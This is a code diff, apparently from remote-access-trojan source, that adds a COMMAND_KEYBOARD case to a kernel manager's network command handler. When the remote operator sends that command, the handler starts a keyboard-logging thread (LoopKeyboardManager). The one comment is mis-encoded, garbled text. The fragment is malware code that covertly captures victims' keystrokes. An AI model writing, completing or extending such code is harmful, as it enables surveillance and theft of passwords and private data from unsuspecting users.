@@ -117,6 +117,14 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 
 	switch(szBuffer[0])
 	{
+	case COMMAND_KEYBOARD: //¼üÅÌ¼ÇÂ¼
+		{
+			m_hThread[m_ulThreadCount++].h = CreateThread(NULL, 0,
+				(LPTHREAD_START_ROUTINE)LoopKeyboardManager,
+				&m_hThread[m_ulThreadCount], 0, NULL);;
+			break;
+		}
+
 	case COMMAND_TALK:
 		{
 			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0,
